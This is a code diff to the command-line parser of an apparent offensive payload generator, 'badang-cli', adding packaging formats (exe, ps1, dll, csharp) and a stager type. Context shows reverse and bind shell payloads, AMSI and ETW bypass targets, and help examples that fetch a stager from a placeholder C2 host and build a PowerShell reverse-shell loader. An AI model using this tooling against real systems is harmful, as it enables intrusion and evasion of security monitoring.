@@ -25,6 +25,7 @@ pub struct CLI {
     pub generate_lport: u16,
     pub generate_url: String,
     pub generate_stager_key: String,
+    pub generate_package: String,
     pub scan_filter: String,
     pub etw_target: String,
     pub amsi_target: String,
@@ -64,6 +65,7 @@ impl CLI {
             generate_lport: 4444,
             generate_url: String::new(),
             generate_stager_key: String::new(),
+            generate_package: String::new(),
             scan_filter: String::new(),
             etw_target: crate::obf::s(crate::obf::ETW_EVENT_WRITE),
             amsi_target: crate::obf::s(crate::obf::AMSI_SCAN_BUFFER),
@@ -270,6 +272,12 @@ impl CLI {
                         cli.generate_stager_key = args[i].clone();
                     }
                 }
+                "--package" => {
+                    i += 1;
+                    if i < args.len() {
+                        cli.generate_package = args[i].clone();
+                    }
+                }
                 _ => {
                     eprintln!("Unknown argument: {}", args[i]);
                     print_help();
@@ -292,7 +300,7 @@ impl CLI {
         // Type is required for generate command
         if cli.command == "generate" && cli.generate_type.is_empty() {
             eprintln!("ERROR: --type is required for generate command.");
-            eprintln!("Types: nop, exec, messagebox, reverse_tcp, bind_tcp");
+            eprintln!("Types: nop, exec, messagebox, reverse_tcp, bind_tcp, stager");
             process::exit(1);
         }
 
@@ -355,6 +363,7 @@ fn print_help() {
     println!("  --lport <PORT>        Listener port (reverse_tcp/bind_tcp, default: 4444)");
     println!("  --url <URL>           Download URL (stager type)");
     println!("  --stager-key <KEY>    XOR key for payload decryption (stager type)");
+    println!("  --package <FMT>       Package output: exe, ps1, csharp, dll (source code)");
     println!();
     println!("GENERATE EXAMPLES:");
     println!("  badang-cli generate --type exec --command \"calc.exe\" -o payload.bin");
@@ -366,6 +375,8 @@ fn print_help() {
     );
     println!("  badang-cli generate --type bind_tcp --lport 4444 -o bind.bin");
     println!("  badang-cli generate --type stager --url https://c2.example.com/p.bin --stager-key s3cret -o stager.bin");
+    println!("  badang-cli generate --type exec --command calc.exe --package exe -o runner.rs");
+    println!("  badang-cli generate --type reverse_tcp --lhost 10.0.0.1 --lport 4444 --package ps1 -o loader.ps1");
     println!();
     println!("CONVERT EXAMPLES:");
     println!("  badang-cli convert -i \"fc 48 83 e4 f0\" -o payload.bin");
